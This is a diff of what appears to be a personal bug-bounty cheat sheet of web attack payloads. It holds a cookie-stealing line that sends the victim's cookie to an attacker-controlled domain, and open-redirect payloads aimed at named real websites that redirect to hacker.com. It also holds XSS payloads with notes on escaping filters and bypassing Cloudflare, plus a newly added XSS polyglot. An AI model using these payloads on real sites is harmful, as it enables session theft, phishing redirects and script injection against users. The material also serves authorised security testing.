@@ -162,7 +162,7 @@ document.location=“https://my_own_domain/attacker.html?cookie="+cookie;}
 ...................................................................................
 apache 2.4.3 has open redirect in server /login >> https://hackerone.com/reports/1782514
 
-http://example.com?redirect_url=javascript://%250Aalert(1)  >> xss via redirect (rxss)
+http://example.com?redirect_url=javascript://%250Aalert(1)  >> via redirect (rxss)
 logout?service=javascript:alert(1)
 https://smartreports.mtncameroon.net//hacker.com/..;/css      after // that redirect you to hacker.com
 https://www.affirm.com///google.com/?www.affirm.com/?category=interview&page=2    >>redirct it to google 
@@ -278,14 +278,15 @@ login
 
 --------------------------------------------------------------------------------------------------
             (((XSS))
-  <script>alert(\"hossam\")</script>        // add \ before " to escape filter
-cloudflare bypass 
+ - <script>alert(\"hossam\")</script>        // add \ before " to escape filter
+- cloudflare bypass 
 "-alert(0)-"		X
 "-top['al\x65rt'](9)-"	good
 
-example.com/?uid="-top['al\x65rt'](9)-"
-<iframe src="\\www.google.com"></iframe>
-search for xss polyglot 
+- example.com/?uid="-top['al\x65rt'](9)-"
+- <iframe src="\\www.google.com"></iframe>
+- search for xss polyglot 
+- <svg+onload=innerHTML=URL,innerHTML=textContent>#&ltimg/src/onerror=alert(domain)&gt
 
 
 ------------------------------------------------------------
